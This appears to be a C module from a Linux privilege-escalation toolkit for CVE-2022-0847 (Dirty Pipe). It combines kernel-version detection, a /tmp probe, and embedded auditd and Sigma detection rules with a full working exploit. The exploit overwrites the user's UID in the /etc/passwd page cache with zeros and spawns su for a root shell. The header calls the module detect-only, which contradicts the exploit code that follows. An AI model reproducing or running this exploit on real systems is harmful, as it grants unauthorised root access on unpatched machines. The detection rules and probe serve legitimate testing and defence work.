/*
 * dirty_pipe_cve_2022_0847 — SKELETONKEY module
 *
 * Status: 🔵 DETECT-ONLY for now. Exploit lifecycle is a follow-up
 * commit (the C code is well-understood — Max Kellermann's public PoC
 * is the reference — but landing it under the skeletonkey_module
 * interface needs the shared passwd-field/exploit-su helpers in core/
 * which are deferred to Phase 1.5).
 *
 * Affected kernel ranges:
 *   5.8     ≤ K < 5.17         (mainline fix at 5.17, commit 9d2231c5d74e)
 *   5.15.x: K ≤ 5.15.24        (fixed in 5.15.25)
 *   5.10.x: K ≤ 5.10.101       (fixed in 5.10.102)
 *   5.4.x : not affected (bug introduced in 5.8)
 *
 * Detect logic:
 *   - Parse uname() release into major.minor.patch
 *   - If kernel < 5.8 → SKELETONKEY_OK (bug not introduced yet)
 *   - If kernel is on a branch with a known backport, compare patch
 *     level (above threshold = patched, below = vulnerable)
 *   - If kernel >= 5.17 → SKELETONKEY_OK (mainline fix)
 *   - Otherwise → SKELETONKEY_VULNERABLE
 *
 * Edge case: distros sometimes ship custom-numbered kernels (e.g.
 * Ubuntu's `5.15.0-100-generic` where the .100 is Ubuntu's release
 * counter, NOT the upstream patch level). For now we treat that as
 * an unknown distro backport and report SKELETONKEY_TEST_ERROR with a
 * hint. A future enhancement: parse /proc/version's full string
 * which usually includes the upstream patch level after the distro
 * suffix.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

/* _GNU_SOURCE is passed via -D in the top-level Makefile; do not
 * redefine here (warning: redefined). */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"   /* used inside this block only */
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <pwd.h>

/* ---- Dirty Pipe primitive ---------------------------------------- */

/* Fill the pipe to the brim, then drain — the kernel marks every
 * pipe_buffer slot with PIPE_BUF_FLAG_CAN_MERGE during the fill, and
 * the bug is that this flag SURVIVES the drain. So when we splice() a
 * file page in next, the slot inherits the merge flag and any
 * subsequent write() to the pipe lands in the file's page cache. */
static int prepare_pipe(int p[2])
{
    if (pipe(p) < 0) return -1;
    int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size < 0) pipe_size = 65536;
    static char buf[4096];
    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        ssize_t w = write(p[1], buf, n);
        if (w < 0) return -1;
        r -= w;
    }
    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        ssize_t rd = read(p[0], buf, n);
        if (rd < 0) return -1;
        r -= rd;
    }
    return 0;
}

/* Write `data_len` bytes into the page cache of `target_path` starting
 * at byte `offset`. Constraints:
 *   - offset must not be page-aligned (Dirty Pipe needs the splice's
 *     1-byte at offset-1 to land in the same page as our write)
 *   - data_len must fit in the page containing `offset`
 *   - target_path must be readable by the caller
 *   - target_path's file size must extend past `offset + data_len`
 *     (Dirty Pipe can't extend files). */
static int dirty_pipe_write(const char *target_path, off_t offset,
                            const char *data, size_t data_len)
{
    if ((offset & 0xfff) == 0) {
        fprintf(stderr, "[-] dirty_pipe_write: offset is page-aligned; refuse\n");
        return -1;
    }
    size_t in_page = 4096 - (offset & 0xfff);
    if (data_len > in_page) {
        fprintf(stderr, "[-] dirty_pipe_write: writes cannot cross page boundary "
                        "(have %zu, fits %zu)\n", data_len, in_page);
        return -1;
    }
    int fd = open(target_path, O_RDONLY);
    if (fd < 0) { perror("open target"); return -1; }

    int p[2];
    if (prepare_pipe(p) < 0) { close(fd); return -1; }

    /* splice 1 byte from `offset - 1` to seed the pipe slot with the
     * file's page (and inherit the stale CAN_MERGE flag). */
    off_t splice_off = offset - 1;
    ssize_t n = splice(fd, &splice_off, p[1], NULL, 1, 0);
    if (n != 1) {
        fprintf(stderr, "[-] splice failed (n=%zd, errno=%d)\n", n, errno);
        close(fd); close(p[0]); close(p[1]); return -1;
    }

    /* Now write our payload. The kernel merges it into the file page. */
    ssize_t w = write(p[1], data, data_len);

    close(fd); close(p[0]); close(p[1]);
    return (w == (ssize_t)data_len) ? 0 : -1;
}

/* ---- /etc/passwd UID-field helpers (inlined; would migrate to
 *      core/host.{c,h} once a third module needs them). ------------ */

/* Locate the UID field of `username` in /etc/passwd. Returns true on
 * success and fills *uid_off (byte offset of UID), *uid_len (length
 * of UID string), uid_str (copy of UID, NUL-terminated). Requires
 * the UID to be a positive decimal number that fits in 16 bytes. */
static bool find_passwd_uid_field(const char *username,
                                  off_t *uid_off, size_t *uid_len,
                                  char uid_str[16])
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return false; }
    buf[st.st_size] = 0;

    /* find line "username:x:UID:GID:..." */
    size_t ulen = strlen(username);
    char *p = buf;
    while (p < buf + st.st_size) {
        char *eol = strchr(p, '\n');
        if (!eol) eol = buf + st.st_size;
        if (strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
            /* Skip past "username:" then password field */
            char *q = p + ulen + 1;
            char *pw_end = memchr(q, ':', eol - q);
            if (!pw_end) goto next;
            char *uid_begin = pw_end + 1;
            char *uid_end = memchr(uid_begin, ':', eol - uid_begin);
            if (!uid_end) goto next;
            size_t L = uid_end - uid_begin;
            if (L == 0 || L >= 16) goto next;
            memcpy(uid_str, uid_begin, L);
            uid_str[L] = 0;
            *uid_off = (off_t)(uid_begin - buf);
            *uid_len = L;
            free(buf);
            return true;
        }
    next:
        p = eol + 1;
    }
    free(buf);
    return false;
}

/* Evict /etc/passwd from page cache after exploitation. POSIX_FADV_DONTNEED
 * works as a non-root hint; if it doesn't take, try `drop_caches` which
 * requires root (which we just acquired). */
static void revert_passwd_page_cache(void)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
        close(fd);
    }
    /* Belt-and-suspenders: drop_caches=3 wipes all page cache. Best-effort. */
    int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (dc >= 0) {
        if (write(dc, "3\n", 2) < 0) { /* ignore */ }
        close(dc);
    }
}



/* The bug exists on every kernel from 5.8 (introduction) until the
 * fix is backported to that branch. We model "patched" as:
 *  - on the 5.10 branch: 5.10.102 or later
 *  - on the 5.15 branch: 5.15.25 or later
 *  - any kernel 5.16 or later (mainline fix landed for 5.17, so 5.16
 *    only needs 5.16.11 or later; 5.17+ inherits)
 *  - mainline (≥ 5.17) is patched
 */
static const struct kernel_patched_from dirty_pipe_patched_branches[] = {
    {5, 10, 102},  /* 5.10.x backport */
    {5, 15,  25},  /* 5.15.x backport */
    {5, 16,  11},  /* 5.16.x backport (mainline fix lived here briefly) */
    {5, 17,   0},  /* mainline fix lands; everything from here is fine */
};

static const struct kernel_range dirty_pipe_range = {
    .patched_from = dirty_pipe_patched_branches,
    .n_patched_from = sizeof(dirty_pipe_patched_branches) /
                      sizeof(dirty_pipe_patched_branches[0]),
};

/* Active sentinel probe: write a known byte into a /tmp probe file
 * via the Dirty Pipe primitive, then re-read to verify the page cache
 * was actually poisoned. This catches the case where /proc/version
 * looks vulnerable (e.g. Debian 5.10.0-30 — apparent version 5.10.30)
 * but the distro silently backported the fix without bumping the
 * upstream version number visible to uname().
 *
 * Side effects: creates and removes a single file under /tmp. No
 * /etc/passwd writes; safe to run from --scan --active. */
static int dirty_pipe_active_probe(void)
{
    char probe_path[] = "/tmp/skeletonkey-dirty-pipe-probe-XXXXXX";
    int fd = mkstemp(probe_path);
    if (fd < 0) return -1;
    const char seed[16] = "ABCDABCDABCDABCD";
    if (write(fd, seed, sizeof seed) != sizeof seed) { close(fd); unlink(probe_path); return -1; }
    fsync(fd);
    close(fd);

    /* Try writing 'X' at offset 4 — well inside the first page, not
     * page-aligned (offset 4 → page-relative offset 4, not 0). */
    int rc = dirty_pipe_write(probe_path, 4, "X", 1);
    if (rc < 0) {
        unlink(probe_path);
        return 0;   /* primitive could not even fire — patched or blocked */
    }

    /* Re-open and read; if the primitive works, byte 4 reads as 'X'.
     * Use O_RDONLY + read, which goes through the page cache (which
     * we just poisoned if the bug is live). */
    fd = open(probe_path, O_RDONLY);
    if (fd < 0) { unlink(probe_path); return -1; }
    char readback[16] = {0};
    ssize_t got = read(fd, readback, sizeof readback);
    close(fd);
    unlink(probe_path);
    if (got < 5) return -1;
    return readback[4] == 'X' ? 1 : 0;
}

static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] dirty_pipe: could not parse kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 5.8. */
    if (v.major < 5 || (v.major == 5 && v.minor < 8)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] dirty_pipe: kernel %s predates the bug (introduced in 5.8)\n",
                    v.release);
        }
        return SKELETONKEY_OK;
    }

    bool patched_by_version = kernel_range_is_patched(&dirty_pipe_range, &v);

    /* Active probe overrides version-only verdict when requested.
     * The version check is necessary-but-not-sufficient: distros
     * silently backport fixes without bumping the upstream version
     * visible to uname(). The active probe fires the actual primitive
     * and confirms whether it lands. */
    if (ctx->active_probe) {
        if (!ctx->json) {
            fprintf(stderr, "[*] dirty_pipe: running active sentinel probe (safe; /tmp only)\n");
        }
        int probe = dirty_pipe_active_probe();
        if (probe == 1) {
            if (!ctx->json) {
                fprintf(stderr, "[!] dirty_pipe: ACTIVE PROBE CONFIRMED — primitive lands "
                                "(version %s)\n", v.release);
            }
            return SKELETONKEY_VULNERABLE;
        }
        if (probe == 0) {
            if (!ctx->json) {
                fprintf(stderr, "[+] dirty_pipe: active probe sentinel did NOT land — "
                                "primitive blocked (likely patched%s)\n",
                                patched_by_version ? "" : ", or distro silently backported");
            }
            return SKELETONKEY_OK;
        }
        /* probe < 0: probe machinery failed (mkstemp/open/read) — fall
         * back to version-only verdict and report TEST_ERROR caveat */
        if (!ctx->json) {
            fprintf(stderr, "[?] dirty_pipe: active probe machinery failed; "
                            "falling back to version check\n");
        }
    }

    if (patched_by_version) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_pipe: kernel %s is patched (version-only check; "
                            "use --active to confirm empirically)\n", v.release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] dirty_pipe: kernel %s appears VULNERABLE (version-only check)\n"
                        "    Confirm empirically: re-run with --scan --active\n",
                v.release);
    }
    return SKELETONKEY_VULNERABLE;
}

static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx)
{
    /* Re-confirm vulnerability before writing to /etc/passwd. */
    skeletonkey_result_t pre = dirty_pipe_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] dirty_pipe: detect() says not vulnerable; refusing to exploit\n");
        return pre;
    }

    /* Resolve current user. */
    uid_t euid = geteuid();
    struct passwd *pw = getpwuid(euid);
    if (!pw) {
        fprintf(stderr, "[-] dirty_pipe: getpwuid(%d) failed: %s\n", euid, strerror(errno));
        return SKELETONKEY_TEST_ERROR;
    }
    if (euid == 0) {
        fprintf(stderr, "[i] dirty_pipe: already running as root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Find the UID field. Need a 4-digit-or-similar UID we can replace
     * with "0000" of identical width. Refuse if the user's UID width
     * doesn't fit our replacement string. */
    off_t uid_off;
    size_t uid_len;
    char orig_uid[16] = {0};
    if (!find_passwd_uid_field(pw->pw_name, &uid_off, &uid_len, orig_uid)) {
        fprintf(stderr, "[-] dirty_pipe: could not locate %s's UID field in /etc/passwd\n",
                pw->pw_name);
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_pipe: user '%s' UID '%s' at offset %lld (len %zu)\n",
                pw->pw_name, orig_uid, (long long)uid_off, uid_len);
    }

    /* Build replacement: zeros of the same length so we don't shift
     * the line layout. "0000" for a 4-digit UID, "00000" for 5, etc. */
    char replacement[16];
    memset(replacement, '0', uid_len);
    replacement[uid_len] = 0;

    /* Edge case: if offset is page-aligned, splice/CAN_MERGE primitive
     * can't reach it (see prepare_pipe/dirty_pipe_write comments).
     * Vanishingly rare — first user in /etc/passwd typically lives
     * far past the file's first 4096 bytes. Refuse cleanly. */
    if ((uid_off & 0xfff) == 0) {
        fprintf(stderr, "[-] dirty_pipe: UID field is page-aligned; primitive can't write here\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_pipe: overwriting UID '%s' → '%s' via page-cache write\n",
                orig_uid, replacement);
    }
    if (dirty_pipe_write("/etc/passwd", uid_off, replacement, uid_len) < 0) {
        fprintf(stderr, "[-] dirty_pipe: page-cache write failed\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (ctx->no_shell) {
        fprintf(stderr, "[+] dirty_pipe: --no-shell — patch landed; not spawning su.\n"
                        "[i] dirty_pipe: revert with `skeletonkey --cleanup dirty_pipe`\n");
        return SKELETONKEY_EXPLOIT_OK;
    }

    /* /etc/passwd now reports our user as uid 0 (in the page cache).
     * `su` reads the page cache, sees uid 0, drops a root shell. */
    fprintf(stderr, "[+] dirty_pipe: page cache poisoned; spawning su to claim root\n");
    fflush(NULL);
    execlp("su", "su", pw->pw_name, "-c", "/bin/sh", (char *)NULL);
    /* If execlp returns, su didn't actually pop root — revert and report. */
    perror("execlp(su)");
    revert_passwd_page_cache();
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t dirty_pipe_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_pipe: evicting /etc/passwd from page cache\n");
    }
    revert_passwd_page_cache();
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: splice() / F_GETPIPE_SZ / posix_fadvise() are
 * Linux-only kernel surface; the Dirty Pipe primitive is structurally
 * unreachable elsewhere. Stub out cleanly so the module still
 * registers and `--list` / `--detect-rules` work on macOS/BSD dev
 * boxes — and so the top-level `make` actually completes there. */
static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] dirty_pipe: Linux-only module "
                "(splice + PIPE_BUF_FLAG_CAN_MERGE) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] dirty_pipe: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_pipe_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* Embedded detection rules — keep the binary self-contained so
 * `skeletonkey --detect-rules --format=auditd` works without a separate
 * data-dir install. */
static const char dirty_pipe_auditd[] =
    "# Dirty Pipe (CVE-2022-0847) — auditd detection rules\n"
    "# See modules/dirty_pipe_cve_2022_0847/detect/auditd.rules for full version.\n"
    "-w /etc/passwd    -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/shadow    -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/sudoers   -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/sudoers.d -p wa -k skeletonkey-dirty-pipe\n"
    "-a always,exit -F arch=b64 -S splice -k skeletonkey-dirty-pipe-splice\n"
    "-a always,exit -F arch=b32 -S splice -k skeletonkey-dirty-pipe-splice\n";

static const char dirty_pipe_sigma[] =
    "title: Possible Dirty Pipe exploitation (CVE-2022-0847)\n"
    "id: f6b13c08-skeletonkey-dirty-pipe\n"
    "status: experimental\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  modification:\n"
    "    type: 'PATH'\n"
    "    name|startswith: ['/etc/passwd', '/etc/shadow', '/etc/sudoers']\n"
    "  not_root:\n"
    "    auid|expression: '!= 0'\n"
    "  condition: modification and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2022.0847]\n";

const struct skeletonkey_module dirty_pipe_module = {
    .name           = "dirty_pipe",
    .cve            = "CVE-2022-0847",
    .summary        = "pipe_buffer CAN_MERGE flag inheritance → page-cache write",
    .family         = "dirty_pipe",
    .kernel_range   = "5.8 ≤ K, fixed mainline 5.17, backports: 5.10.102 / 5.15.25 / 5.16.11",
    .detect         = dirty_pipe_detect,
    .exploit        = dirty_pipe_exploit,
    .mitigate       = NULL,
    .cleanup        = dirty_pipe_cleanup,
    .detect_auditd  = dirty_pipe_auditd,
    .detect_sigma   = dirty_pipe_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_dirty_pipe(void)
{
    skeletonkey_register(&dirty_pipe_module);
}
